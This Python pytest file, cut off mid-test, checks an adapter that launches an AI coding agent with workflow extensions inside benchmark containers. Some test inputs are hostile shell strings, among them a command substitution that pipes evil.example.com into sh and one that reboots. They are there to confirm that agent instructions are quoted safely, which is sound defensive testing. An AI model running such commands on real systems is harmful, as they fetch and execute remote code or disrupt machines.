import asyncio
import json
import shlex
from pathlib import Path

import pytest
from harbor.models.agent.context import AgentContext

import kimchi_agent.workflow_agent as workflow_agent_module
from kimchi_agent.agent import BINARY_PATH
from kimchi_agent.agent import Kimchi as StockKimchi
from kimchi_agent.workflow_agent import (
    CONTAINER_EXTENSION_DIR,
    CONTAINER_WORKFLOWS_STAGE_DIR,
    PROJECT_WORKFLOWS_DIR,
    WORKFLOW_INPUT_PATH,
    WorkflowAgent,
)
from kimchi_agent.workflow_extension import (
    DirExtensionSpec,
    NpmExtensionSpec,
    ResolvedExtension,
    parse_extension_spec,
    resolve_extension_spec,
)


class _RecordingExecMixin:
    """Shared with agent_test.py's RecordingKimchi in spirit, not in code: each
    kimchi_agent test file declares its own recording harness (see
    gsd_kimchi_test.py's RecordingGsdKimchi) rather than importing test
    doubles across modules.
    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.agent_commands: list[str] = []
        self.agent_envs: list[dict[str, str] | None] = []
        self.root_commands: list[str] = []
        self.setup_commands: list[str] = []

    async def exec_as_agent(self, _environment, command: str, env=None, cwd=None, timeout_sec=None):
        # Install-time housekeeping is recorded apart so agent_commands[0] stays the launch.
        if BINARY_PATH not in command:
            self.setup_commands.append(command)
            return
        self.agent_commands.append(command)
        self.agent_envs.append(env)
        raise asyncio.CancelledError

    async def exec_as_root(self, _environment, command: str, env=None, cwd=None, timeout_sec=None):
        self.root_commands.append(command)


class RecordingWorkflowAgent(_RecordingExecMixin, WorkflowAgent):
    pass


class RecordingStockKimchi(_RecordingExecMixin, StockKimchi):
    pass


class FakeEnvironment:
    """Records upload_dir calls; install() tests never touch a real container."""

    def __init__(self) -> None:
        self.uploaded_dirs: list[tuple[Path, str]] = []

    async def upload_dir(self, source_dir: Path | str, target_dir: str) -> None:
        self.uploaded_dirs.append((Path(source_dir), target_dir))


@pytest.fixture(autouse=True)
def kimchi_test_env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("KIMCHI_API_KEY", "test-key")
    monkeypatch.delenv("KIMCHI_CODE_BINARY", raising=False)
    monkeypatch.delenv("KIMCHI_TAGS", raising=False)
    monkeypatch.delenv("RUN_ID", raising=False)


def _agent(tmp_path: Path, **overrides) -> RecordingWorkflowAgent:
    kwargs = {
        "logs_dir": tmp_path / "jobs" / "run-1" / "task__trial" / "agent",
        "model_name": "kimchi-dev/kimi-k2.6",
        "extension": "dir:/some/host/kimchi-workflows",
        "workflow": "tb-solver",
    }
    kwargs.update(overrides)
    return RecordingWorkflowAgent(**kwargs)


def _write_fake_kimchi_binary_env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    # Points KIMCHI_CODE_BINARY at a throwaway bin/+share/ tree so
    # Kimchi.install() (called first by WorkflowAgent.install()) takes the
    # local-binary branch instead of hitting the GitHub releases API.
    dist_dir = tmp_path / "kimchi-dist"
    bin_path = dist_dir / "bin" / "kimchi"
    bin_path.parent.mkdir(parents=True)
    bin_path.write_text("#!/bin/sh\necho fake\n")
    bin_path.chmod(0o755)
    share_dir = dist_dir / "share" / "kimchi"
    share_dir.mkdir(parents=True)
    (share_dir / "package.json").write_text("{}")
    monkeypatch.setenv("KIMCHI_CODE_BINARY", str(bin_path))


# --- extension spec classification (module-level, no agent involved) -------


@pytest.mark.parametrize(
    "raw",
    [
        "npm:@kimchi-dev/kimchi-workflows",
        "npm:@kimchi-dev/kimchi-workflows@0.1.0",
        "npm:kimchi-workflows@1.2.3",
        # Unscoped, no version.
        "npm:kimchi-workflows",
        # Scoped, prerelease version (the run-workflow.sh default's shape).
        "npm:@kimchi-dev/kimchi-workflows@0.0.1-0",
    ],
)
def test_parse_extension_spec_npm_is_classified(raw: str) -> None:
    # Classification only: parse_extension_spec does not split package/version
    # here — that happens later, in resolve_extension_spec, only when a spec
    # actually needs resolving (workflow_extension_test.py covers the split).
    assert parse_extension_spec(raw) == NpmExtensionSpec(raw=raw)


def test_parse_extension_spec_dir() -> None:
    assert parse_extension_spec("dir:/abs/path/to/kimchi-workflows") == DirExtensionSpec(
        path=Path("/abs/path/to/kimchi-workflows")
    )


@pytest.mark.parametrize(
    "raw",
    [
        "",
        "   ",
        "bogus",
        "castai/kimchi-workflows",
        "dir:",
    ],
)
def test_parse_extension_spec_rejects_unclassifiable_input(raw: str) -> None:
    with pytest.raises(ValueError, match="extension"):
        parse_extension_spec(raw)


def test_parse_extension_spec_rejection_message_lists_accepted_forms() -> None:
    with pytest.raises(ValueError) as exc_info:
        parse_extension_spec("bogus")
    message = str(exc_info.value)
    assert "npm:" in message
    assert "dir:" in message


# --- extension spec classification: git: is REMOVED, not passthrough --------


@pytest.mark.parametrize(
    "raw",
    [
        "git:github.com/kimchi-dev/kimchi-workflows",
        "git:github.com/kimchi-dev/kimchi-workflows@v1",
        # pi's scp-like SSH shorthand.
        "git:git@github.com:kimchi-dev/kimchi-workflows@v1",
        # Bare URL forms pi also accepts directly, with no "git:" prefix.
        "https://github.com/kimchi-dev/kimchi-workflows.git",
        "http://internal.example.com/kimchi-workflows.git",
        "ssh://git@github.com/kimchi-dev/kimchi-workflows.git",
        "git://github.com/kimchi-dev/kimchi-workflows.git",
    ],
)
def test_parse_extension_spec_rejects_git_family_with_a_specific_message(raw: str) -> None:
    # A git-family spec is not just unrecognised — it is a form that USED to
    # be accepted (as pi-native passthrough) and was deliberately removed
    # once a smoke trial proved passthrough resolution can't work inside a
    # terminal-bench task container (no Node toolchain). The rejection
    # message says so, rather than reading like a typo in the prefix.
    with pytest.raises(ValueError) as exc_info:
        parse_extension_spec(raw)
    message = str(exc_info.value)
    assert "git:" in message
    assert "npm:" in message
    assert "dir:" in message
    assert raw in message


# --- agent kwarg parsing (WorkflowAgent construction) -----------------------


@pytest.mark.parametrize(
    "extension",
    [
        "npm:@kimchi-dev/kimchi-workflows@0.1.0",
        "npm:@kimchi-dev/kimchi-workflows",
        "npm:kimchi-workflows@1.2.3",
        "dir:/abs/path/to/kimchi-workflows",
        "dir:~/dev/kimchi-workflows",
    ],
)
def test_valid_extension_kwargs_are_accepted_at_construction(tmp_path: Path, extension: str) -> None:
    agent = _agent(tmp_path, extension=extension)
    assert agent._workflow == "tb-solver"


@pytest.mark.parametrize(
    "extension",
    [
        "",
        "bogus",
        "dir:",
        # git: was removed, not merely never-implemented — construction must
        # reject it with the same specific message parse_extension_spec
        # raises, not a generic "malformed" one.
        "git:github.com/kimchi-dev/kimchi-workflows@main",
        "https://github.com/kimchi-dev/kimchi-workflows.git",
    ],
)
def test_malformed_extension_kwarg_is_rejected_at_construction(tmp_path: Path, extension: str) -> None:
    with pytest.raises(ValueError, match="extension"):
        _agent(tmp_path, extension=extension)


def test_missing_extension_kwarg_is_rejected(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="extension"):
        _agent(tmp_path, extension=None)


def test_missing_workflow_kwarg_is_rejected(tmp_path: Path) -> None:
    with pytest.raises(ValueError, match="workflow"):
        _agent(tmp_path, workflow=None)


# --- launch command: extension paths (both forms are host-resolved now) ----


@pytest.mark.parametrize(
    "extension",
    ["dir:/some/host/kimchi-workflows", "npm:@kimchi-dev/kimchi-workflows@0.1.0"],
    ids=["dir", "npm"],
)
def test_extension_paths_is_always_the_container_dir(tmp_path: Path, extension: str) -> None:
    # Neither form is passthrough any more: both are resolved on the host
    # and uploaded to the same container path, so _extension_paths is no
    # longer a function of which form was given.
    agent = _agent(tmp_path, extension=extension)
    assert agent._extension_paths() == [CONTAINER_EXTENSION_DIR]


async def test_launch_command_has_exactly_one_extension_flag(tmp_path: Path) -> None:
    agent = _agent(tmp_path)

    with pytest.raises(asyncio.CancelledError):
        await agent.run("do the task", object(), AgentContext())

    command = agent.agent_commands[0]
    assert command.count("-e ") == 1
    assert f"-e {CONTAINER_EXTENSION_DIR} --enable-experimental-features --print" in command


async def test_moonshot_workflow_does_not_require_kimchi_api_key(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.delenv("KIMCHI_API_KEY", raising=False)
    monkeypatch.setenv("MOONSHOT_API_KEY", "sk-moonshot-test")
    agent = _agent(tmp_path, model_name="moonshotai/kimi-k3")

    with pytest.raises(asyncio.CancelledError):
        await agent.run("do the task", object(), AgentContext())

    env = agent.agent_envs[0]
    assert env is not None
    assert env["MOONSHOT_API_KEY"] == "sk-moonshot-test"
    assert "KIMCHI_API_KEY" not in env


# --- install(): npm: (now host-resolved + uploaded, exactly like dir:) ------


async def test_npm_spec_resolves_on_host_and_uploads_to_container_path(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _write_fake_kimchi_binary_env(tmp_path, monkeypatch)
    fake_workflows_dir = tmp_path / "fake-workflows"
    fake_workflows_dir.mkdir()
    (fake_workflows_dir / "tb-solver.workflow.ts").write_text("export default {}")
    monkeypatch.setattr(workflow_agent_module, "WORKFLOWS_HOST_DIR", fake_workflows_dir)

    fake_extension_dir = tmp_path / "fake-npm-ext"
    fake_extension_dir.mkdir()
    resolver_calls = []

    def fake_resolver(spec):
        resolver_calls.append(spec)
        return ResolvedExtension(
            host_dir=fake_extension_dir,
            identity="npm:@kimchi-dev/kimchi-workflows@0.1.0+sha512-abc123",
            short_identity="npm:@kimchi-dev/kimchi-workflows@0.1.0+abc123",
        )

    extension = "npm:@kimchi-dev/kimchi-workflows@0.1.0"
    agent = _agent(tmp_path, extension=extension, extension_resolver=fake_resolver)
    environment = FakeEnvironment()

    await agent.install(environment)

    # Invoked exactly once with the parsed spec (not called again on a
    # second install() — that's the WorkflowAgent-level half of "resolves
    # once per job"; workflow_extension_test.py covers the on-disk cache that
    # makes a *second agent instance* in the same job just as cheap).
    assert len(resolver_calls) == 1
    assert resolver_calls[0] == NpmExtensionSpec(raw=extension)
    assert (fake_extension_dir, CONTAINER_EXTENSION_DIR) in environment.uploaded_dirs
    assert CONTAINER_WORKFLOWS_STAGE_DIR in [target for _, target in environment.uploaded_dirs]


async def test_npm_spec_never_reaches_the_launch_command_as_a_raw_string(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The `-e` flag must carry the container path, never the raw "npm:..."
    # spec — that string only ever existed on the host, in this test's fake
    # resolver's input; it must not leak onto the command line kimchi runs.
    _write_fake_kimchi_binary_env(tmp_path, monkeypatch)
    fake_workflows_dir = tmp_path / "fake-workflows"
    fake_workflows_dir.mkdir()
    (fake_workflows_dir / "tb-solver.workflow.ts").write_text("export default {}")
    monkeypatch.setattr(workflow_agent_module, "WORKFLOWS_HOST_DIR", fake_workflows_dir)

    fake_extension_dir = tmp_path / "fake-npm-ext"
    fake_extension_dir.mkdir()
    extension = "npm:@kimchi-dev/kimchi-workflows@0.1.0"

    agent = _agent(
        tmp_path,
        extension=extension,
        extension_resolver=lambda spec: ResolvedExtension(
            host_dir=fake_extension_dir, identity=extension, short_identity=extension
        ),
    )
    await agent.install(FakeEnvironment())

    with pytest.raises(asyncio.CancelledError):
        await agent.run("do the task", object(), AgentContext())

    command = agent.agent_commands[0]
    assert f"-e {CONTAINER_EXTENSION_DIR} --enable-experimental-features --print" in command
    assert "npm:" not in command


# --- stdin payload / instruction handling -------------------------------------


async def test_stdin_payload_is_the_workflow_run_command_line(tmp_path: Path) -> None:
    agent = _agent(tmp_path, workflow="tb-solver")

    with pytest.raises(asyncio.CancelledError):
        await agent.run("do the task", object(), AgentContext())

    command = agent.agent_commands[0]
    expected_stdin = f"/workflow run tb-solver --input @{WORKFLOW_INPUT_PATH}"
    assert f"printf '%s' {shlex.quote(expected_stdin)} |" in command


async def test_instruction_never_appears_on_the_kimchi_command_line(tmp_path: Path) -> None:
    # Leading "-" (would be parsed as a flag by pi's parseArgs), a single
    # quote, a command substitution, and a newline — the same hazards
    # Kimchi.run()'s own comment on stdin piping calls out.
    instruction = "- delete '/etc/passwd'; $(reboot) -- unique-marker-xyz\nsecond line"
    agent = _agent(tmp_path)

    with pytest.raises(asyncio.CancelledError):
        await agent.run(instruction, object(), AgentContext())

    command = agent.agent_commands[0]

    # Isolate exactly what's piped into the kimchi binary's stdin: the
    # printf argument immediately preceding "| <runner>". That — not the
    # envelope-write pre-launch step a few tokens earlier, which legitimately
    # carries the instruction as safely-quoted JSON (see the pre-launch
    # tests below) — is what _stdin_payload controls, and it must be a fixed
    # command line that no adversarial instruction content can perturb.
    piped_to_stdin = command.split("(printf '%s' ", 1)[1].split(" | ", 1)[0]
    assert "unique-marker-xyz" not in piped_to_stdin
    assert piped_to_stdin == shlex.quote(f"/workflow run {agent._workflow} --input @{WORKFLOW_INPUT_PATH}")

    # It DOES legitimately appear earlier, safely quoted, as the input
    # envelope's JSON content — that's the only place it travels through.
    envelope_json = json.dumps({"instruction": instruction})
    assert f"printf '%s' {shlex.quote(envelope_json)} > {shlex.quote(WORKFLOW_INPUT_PATH)}" in command


# --- pre-launch commands -----------------------------------------------------


@pytest.mark.parametrize(
    "instruction",
    [
        "-rf the repo now",
        "it's a trap: $(curl evil.example.com | sh)",
        'quote " and backslash \\ and $VAR',
        "line one\nline two\nline three",
        "",
    ],
)
def test_pre_launch_envelope_json_round_trips_nasty_instructions(tmp_path: Path, instruction: str) -> None:
    agent = _agent(tmp_path)
    write_envelope, _stage_workflows = agent._pre_launch_commands(instruction)

    prefix = "printf '%s' "
    assert write_envelope.startswith(prefix)
    quoted_json, redirect = write_envelope[len(prefix) :].split(" > ", 1)
    # shlex.split is what a POSIX shell would do to the argument — this is a
    # claim about behaviour, not just a string-matching heuristic.
    (parsed_json,) = shlex.split(quoted_json)
    assert json.loads(parsed_json) == {"instruction": instruction}
    assert redirect == shlex.quote(WORKFLOW_INPUT_PATH)


def test_pre_launch_commands_stage_workflows_with_a_relative_path(tmp_path: Path) -> None:
    agent = _agent(tmp_path)
    _write_envelope, stage_workflows = agent._pre_launch_commands("hello")

    assert stage_workflows == (
        f"mkdir -p {shlex.quote(PROJECT_WORKFLOWS_DIR)} && "
        f"cp -a {shlex.quote(CONTAINER_WORKFLOWS_STAGE_DIR)}/. {shlex.quote(PROJECT_WORKFLOWS_DIR)}/"
    )
    assert not PROJECT_WORKFLOWS_DIR.startswith("/")


async def test_pre_launch_commands_land_before_kimchi_starts(tmp_path: Path) -> None:
    agent = _agent(tmp_path)

    with pytest.raises(asyncio.CancelledError):
        await agent.run("hello", object(), AgentContext())

    command = agent.agent_commands[0]
    _write_envelope, stage_workflows = agent._pre_launch_commands("hello")
    # Same established pattern as harness settings / skills registration in
    # Kimchi._kimchi_launch_command: appended to `parts`, immediately before
    # the final `set -m && { ... }` block that launches kimchi.
    assert f"{stage_workflows} && set -m" in command


# --- to_agent_info() ----------------------------------------------------------


def test_to_agent_info_before_install_reports_unresolved_extension(tmp_path: Path) -> None:
    agent = _agent(tmp_path, workflow="tb-solver", version="1.2.3")
    info = agent.to_agent_info()
    assert info.name == "kimchi-workflow"
    assert info.version == "1.2.3+tb-solver@unresolved"


def test_to_agent_info_differs_by_workflow_name_over_one_binary(tmp_path: Path) -> None:
    identity = "deadbeefcafe"
    agent_a = _agent(tmp_path, workflow="tb-solver", version="1.2.3")
    agent_a._extension_short_identity = identity
    agent_b = _agent(tmp_path, workflow="tb-solver-v2", version="1.2.3")
    agent_b._extension_short_identity = identity

    info_a = agent_a.to_agent_info()
    info_b = agent_b.to_agent_info()

    assert info_a.version == "1.2.3+tb-solver@deadbeefcafe"
    assert info_b.version == "1.2.3+tb-solver-v2@deadbeefcafe"
    assert info_a.version != info_b.version


def test_to_agent_info_matches_for_two_runs_of_the_same_workflow_name(tmp_path: Path) -> None:
    # Accepted limitation: workflow file CONTENT isn't captured in the
    # version string, so two runs of an edited workflow that kept its
    # declared name are indistinguishable in result.json. Asserted
    # deliberately, so the limitation stays documented in code rather than
    # only in prose — see workflow_agent.py's to_agent_info() docstring.
    identity = "deadbeefcafe"
    agent_before_edit = _agent(tmp_path, workflow="tb-solver", version="1.2.3")
    agent_before_edit._extension_short_identity = identity
    agent_after_edit = _agent(tmp_path, workflow="tb-solver", version="1.2.3")
    agent_after_edit._extension_short_identity = identity

    assert agent_before_edit.to_agent_info().version == agent_after_edit.to_agent_info().version


async def test_to_agent_info_identity_for_npm_spec_uses_the_resolved_short_identity(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # Unlike the old passthrough design, an npm: spec's recorded identity is
    # no longer the raw spec string — it's whatever resolve_extension_spec
    # (here, a fake standing in for it) reports as short_identity, which for
    # the real resolver is the RESOLVED version plus a shortened registry
    # integrity/shasum (workflow_extension._npm_identity; exercised directly
    # in workflow_extension_test.py, not re-tested here).
    _write_fake_kimchi_binary_env(tmp_path, monkeypatch)
    fake_workflows_dir = tmp_path / "fake-workflows"
    fake_workflows_dir.mkdir()
    (fake_workflows_dir / "tb-solver.workflow.ts").write_text("export default {}")
    monkeypatch.setattr(workflow_agent_module, "WORKFLOWS_HOST_DIR", fake_workflows_dir)

    fake_extension_dir = tmp_path / "fake-npm-ext"
    fake_extension_dir.mkdir()
    resolved_short_identity = "npm:@kimchi-dev/kimchi-workflows@0.1.0+abc123def456"
    agent = _agent(
        tmp_path,
        extension="npm:@kimchi-dev/kimchi-workflows@0.1.0",
        workflow="tb-solver",
        version="1.2.3",
        extension_resolver=lambda spec: ResolvedExtension(
            host_dir=fake_extension_dir,
            identity="npm:@kimchi-dev/kimchi-workflows@0.1.0+sha512-abc123def456...==",
            short_identity=resolved_short_identity,
        ),
    )
    await agent.install(FakeEnvironment())

    assert agent.to_agent_info().version == f"1.2.3+tb-solver@{resolved_short_identity}"


async def test_to_agent_info_identity_for_npm_spec_differs_when_the_resolved_version_differs(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The reproducibility problem the old passthrough design had with an
    # unpinned spec — two runs recording the identical spec string even when
    # pi resolved different code for each — does not carry over to host
    # resolution: the adapter now genuinely learns the resolved version each
    # time, so two resolves that land on different versions (e.g. a floating
    # dist-tag moving between job runs) DO get different recorded identities.
    _write_fake_kimchi_binary_env(tmp_path, monkeypatch)
    fake_workflows_dir = tmp_path / "fake-workflows"
    fake_workflows_dir.mkdir()
    (fake_workflows_dir / "tb-solver.workflow.ts").write_text("export default {}")
    monkeypatch.setattr(workflow_agent_module, "WORKFLOWS_HOST_DIR", fake_workflows_dir)

    fake_extension_dir = tmp_path / "fake-npm-ext"
    fake_extension_dir.mkdir()
    extension = "npm:@kimchi-dev/kimchi-workflows"  # unpinned

    def resolver_for(version: str):
        return lambda spec: ResolvedExtension(
            host_dir=fake_extension_dir,
            identity=f"npm:@kimchi-dev/kimchi-workflows@{version}",
            short_identity=f"npm:@kimchi-dev/kimchi-workflows@{version}",
        )

    agent_run_1 = _agent(
        tmp_path, extension=extension, workflow="tb-solver", version="1.2.3", extension_resolver=resolver_for("0.1.0")
    )
    agent_run_2 = _agent(
        tmp_path, extension=extension, workflow="tb-solver", version="1.2.3", extension_resolver=resolver_for("0.2.0")
    )
    await agent_run_1.install(FakeEnvironment())
    await agent_run_2.install(FakeEnvironment())

    assert agent_run_1.to_agent_info().version != agent_run_2.to_agent_info().version


# --- env dict: no new environment variables for stock Kimchi / dir: spec ----


@pytest.mark.parametrize(
    "extension",
    ["dir:/some/host/kimchi-workflows", "npm:@kimchi-dev/kimchi-workflows@0.1.0"],
    ids=["dir", "npm"],
)
async def test_env_dict_has_exactly_the_same_keys_as_stock_kimchi(tmp_path: Path, extension: str) -> None:
    # Neither form adds anything to the env dict any more: the `_extra_run_env`
    # seam that used to exist purely for git:-family specs' non-interactive-git
    # variables was removed along with `git:` support (nothing overrides it any
    # more), so both remaining forms stay exactly at parity with stock Kimchi.
    # run() never calls install()/resolve_extension_spec — _extension_paths()
    # is a constant regardless of spec form (see the test above) — so no
    # extension_resolver injection is needed here to keep this off the network.
    logs_dir = tmp_path / "jobs" / "run-1" / "task__trial" / "agent"
    stock = RecordingStockKimchi(logs_dir=logs_dir, model_name="kimchi-dev/kimi-k2.6")
    workflow = _agent(tmp_path, extension=extension)

    with pytest.raises(asyncio.CancelledError):
        await stock.run("hello", object(), AgentContext())
    with pytest.raises(asyncio.CancelledError):
        await workflow.run("hello", object(), AgentContext())

    assert set(workflow.agent_envs[0].keys()) == set(stock.agent_envs[0].keys())


# --- prompt template applied exactly once ------------------------------------


async def test_prompt_template_applied_exactly_once(tmp_path: Path) -> None:
    template_path = tmp_path / "template.j2"
    template_path.write_text("TASK: {{ instruction }}")
    agent = _agent(tmp_path, prompt_template_path=template_path)

    with pytest.raises(asyncio.CancelledError):
        await agent.run("hello", object(), AgentContext())

    command = agent.agent_commands[0]
    assert "TASK: hello" in command
    assert "TASK: TASK: hello" not in command


# --- install(): dir: (host-resolved, uploaded) --------------------------------


async def test_install_uploads_extension_and_staged_workflow_sources(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _write_fake_kimchi_binary_env(tmp_path, monkeypatch)

    fake_extension_dir = tmp_path / "fake-ext"
    fake_extension_dir.mkdir()
    fake_workflows_dir = tmp_path / "fake-workflows"
    fake_workflows_dir.mkdir()
    (fake_workflows_dir / "tb-solver.workflow.ts").write_text("export default {}")
    monkeypatch.setattr(workflow_agent_module, "WORKFLOWS_HOST_DIR", fake_workflows_dir)

    resolver_calls = []

    def fake_resolver(spec):
        resolver_calls.append(spec)
        return ResolvedExtension(
            host_dir=fake_extension_dir,
            identity="deadbeefcafebabedeadbeefcafebabedead1234",
            short_identity="deadbeefcafe",
        )

    agent = _agent(tmp_path, extension_resolver=fake_resolver)
    environment = FakeEnvironment()

    await agent.install(environment)

    assert len(resolver_calls) == 1
    # to_agent_info() embeds the SHORT identity; the full sha stays on the
    # ResolvedExtension. A dir: identity does not truncate like a sha does
    # (see ResolvedExtension's docstring), which is why these are two fields.
    assert agent._extension_short_identity == "deadbeefcafe"
    assert (fake_extension_dir, CONTAINER_EXTENSION_DIR) in environment.uploaded_dirs
    # The workflows upload is a FILTERED copy (see the toolchain test below),
    # so its source is a staging directory, not workflows/ itself. What has to
    # hold is that something landed at the staging target.
    assert CONTAINER_WORKFLOWS_STAGE_DIR in [target for _, target in environment.uploaded_dirs]


async def test_install_fails_loudly_when_no_workflow_ts_files_exist(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _write_fake_kimchi_binary_env(tmp_path, monkeypatch)

    empty_workflows_dir = tmp_path / "empty-workflows"
    empty_workflows_dir.mkdir()
    monkeypatch.setattr(workflow_agent_module, "WORKFLOWS_HOST_DIR", empty_workflows_dir)

    fake_extension_dir = tmp_path / "fake-ext"
    fake_extension_dir.mkdir()

    agent = _agent(
        tmp_path,
        extension_resolver=lambda spec: ResolvedExtension(
            host_dir=fake_extension_dir, identity="a" * 40, short_identity="a" * 12
        ),
    )

    with pytest.raises(RuntimeError, match=r"\*\.workflow\.ts"):
        await agent.install(FakeEnvironment())


async def test_install_does_not_count_a_workflow_file_that_the_upload_filter_strips(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # `workflows/node_modules/@kimchi-dev/kimchi-workflows` really does ship a
    # `create.workflow.ts`, and WORKFLOWS_UPLOAD_IGNORE strips `node_modules`
    # from the upload — so a *.workflow.ts found there is proof of nothing. A
    # guard that scanned the source tree recursively would accept it and let a
    # workflow-less directory reach a trial; scanning the staged copy cannot.
    #
    # Addressed by PATH here because that is the form with no second line of
    # defence: a name would still fail the top-level check afterwards.
    _write_fake_kimchi_binary_env(tmp_path, monkeypatch)

    workflows_dir = tmp_path / "workflows"
    buried = workflows_dir / "node_modules" / "@kimchi-dev" / "kimchi-workflows" / "src" / "host" / "builtin"
    buried.mkdir(parents=True)
    (buried / "create.workflow.ts").write_text("export default {}\n")
    monkeypatch.setattr(workflow_agent_module, "WORKFLOWS_HOST_DIR", workflows_dir)

    fake_extension_dir = tmp_path / "fake-ext"
    fake_extension_dir.mkdir()
    agent = _agent(
        tmp_path,
        workflow=f"{PROJECT_WORKFLOWS_DIR}/node_modules/@kimchi-dev/kimchi-workflows/src/host/builtin/create.workflow.ts",
        extension_resolver=lambda spec: ResolvedExtension(
            host_dir=fake_extension_dir, identity="a" * 40, short_identity="a" * 12
        ),
    )

    with pytest.raises(RuntimeError, match=r"\*\.workflow\.ts"):
        await agent.install(FakeEnvironment())


async def test_install_rejects_a_nested_only_layout_when_the_workflow_is_addressed_by_name(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # `discoverWorkflows` does a non-recursive readdir, so a name can only ever
    # resolve against the TOP level. A tree whose only *.workflow.ts files are
    # nested is therefore unusable for `workflow=<declared name>` — and the
    # recursive upload copying them anyway is exactly what makes that
    # unusability silent until the trial. Catch it at install instead.
    _write_fake_kimchi_binary_env(tmp_path, monkeypatch)

    workflows_dir = tmp_path / "workflows"
    (workflows_dir / "nested").mkdir(parents=True)
    (workflows_dir / "nested" / "ferment-oneshot.workflow.ts").write_text("export default {}\n")
    monkeypatch.setattr(workflow_agent_module, "WORKFLOWS_HOST_DIR", workflows_dir)

    fake_extension_dir = tmp_path / "fake-ext"
    fake_extension_dir.mkdir()
    agent = _agent(
        tmp_path,
        workflow="ferment-oneshot",
        extension_resolver=lambda spec: ResolvedExtension(
            host_dir=fake_extension_dir, identity="a" * 40, short_identity="a" * 12
        ),
    )

    with pytest.raises(RuntimeError, match="non-recursive"):
        await agent.install(FakeEnvironment())


async def test_install_accepts_a_nested_layout_when_the_workflow_is_addressed_by_path(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The other half of that guard: `resolveWorkflow` tries an explicit `.ts`
    # path against the project root BEFORE any name lookup, and that route
    # reaches a nested file fine. Rejecting this layout — which a purely
    # top-level check would — would be a false install failure for a
    # configuration that runs correctly.
    _write_fake_kimchi_binary_env(tmp_path, monkeypatch)

    workflows_dir = tmp_path / "workflows"
    (workflows_dir / "nested").mkdir(parents=True)
    (workflows_dir / "nested" / "ferment-oneshot.workflow.ts").write_text("export default {}\n")
    monkeypatch.setattr(workflow_agent_module, "WORKFLOWS_HOST_DIR", workflows_dir)

    fake_extension_dir = tmp_path / "fake-ext"
    fake_extension_dir.mkdir()
    agent = _agent(
        tmp_path,
        workflow=f"{PROJECT_WORKFLOWS_DIR}/nested/ferment-oneshot.workflow.ts",
        extension_resolver=lambda spec: ResolvedExtension(
            host_dir=fake_extension_dir, identity="a" * 40, short_identity="a" * 12
        ),
    )

    class SnapshottingEnvironment(FakeEnvironment):
        def __init__(self) -> None:
            super().__init__()
            self.staged_files: set[str] = set()

        async def upload_dir(self, source_dir: Path | str, target_dir: str) -> None:
            await super().upload_dir(source_dir, target_dir)
            if target_dir == CONTAINER_WORKFLOWS_STAGE_DIR:
                root = Path(source_dir)
                self.staged_files = {p.relative_to(root).as_posix() for p in root.rglob("*") if p.is_file()}

    environment = SnapshottingEnvironment()
    await agent.install(environment)  # must not raise

    # The nested file has to actually reach the container, or the path form
    # would resolve to nothing there — the guard passing is only half the claim.
    assert environment.staged_files == {"nested/ferment-oneshot.workflow.ts"}


def test_dir_spec_short_identity_is_not_a_truncated_path(tmp_path: Path) -> None:
    # Regression: `short_identity` exists because a dir: identity does not
    # truncate like a sha does. `dir:<abspath>@<sha>`[:12] is `dir:/Users/m` —
    # the sha-or-"dirty" marker gone, and every checkout under one home
    # directory rendered identically. Since dir: IS the local development
    # path, that made exactly the runs a developer is comparing
    # indistinguishable from each other in result.json.
    checkout = tmp_path / "kimchi-workflows"
    checkout.mkdir()

    resolved = resolve_extension_spec(DirExtensionSpec(path=checkout))

    assert resolved.short_identity.startswith("dir:kimchi-workflows@")
    assert str(tmp_path) not in resolved.short_identity
    # tmp_path is not a git checkout, so the honest answer is "dirty".
    assert resolved.short_identity.endswith("@dirty")
    assert resolved.identity == f"dir:{checkout}@dirty"


async def test_install_does_not_upload_the_local_toolchain(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _write_fake_kimchi_binary_env(tmp_path, monkeypatch)
    # workflows/ is a developer's working directory as well as an upload
    # payload. Following its README (`npm install` to typecheck) creates a
    # ~72MB node_modules containing a symlink pointing OUT of the repo at a
    # sibling checkout — and an unfiltered upload put all of it into every task
    # container, on every trial. The container resolves nothing from disk
    # beside a .workflow.ts: the extension loads them through jiti with
    # `typebox` and `@kimchi-dev/kimchi-workflows` served from virtual modules.
    workflows_dir = tmp_path / "workflows"
    (workflows_dir / "ferment").mkdir(parents=True)
    (workflows_dir / "ferment-oneshot.workflow.ts").write_text("export default {}\n")
    (workflows_dir / "ferment" / "contract.ts").write_text("export const x = 1\n")
    (workflows_dir / "node_modules" / "typescript").mkdir(parents=True)
    (workflows_dir / "node_modules" / "typescript" / "big.js").write_text("x\n")
    (workflows_dir / "test").mkdir()
    (workflows_dir / "test" / "ferment-oneshot.test.ts").write_text("// tests\n")
    for name in ("package.json", "tsconfig.json", "vitest.config.ts"):
        (workflows_dir / name).write_text("{}\n")

    fake_extension_dir = tmp_path / "extension"
    fake_extension_dir.mkdir()

    # The staged copy lives in a TemporaryDirectory that install() removes on
    # exit, so the contents have to be captured while the upload is happening.
    class SnapshottingEnvironment(FakeEnvironment):
        def __init__(self) -> None:
            super().__init__()
            self.staged_files: set[str] = set()

        async def upload_dir(self, source_dir: Path | str, target_dir: str) -> None:
            await super().upload_dir(source_dir, target_dir)
            if target_dir == CONTAINER_WORKFLOWS_STAGE_DIR:
                root = Path(source_dir)
                self.staged_files = {p.relative_to(root).as_posix() for p in root.rglob("*") if p.is_file()}

    agent = _agent(
        tmp_path,
        extension_resolver=lambda spec: ResolvedExtension(
            host_dir=fake_extension_dir, identity="a" * 40, short_identity="a" * 12
        ),
    )
    environment = SnapshottingEnvironment()

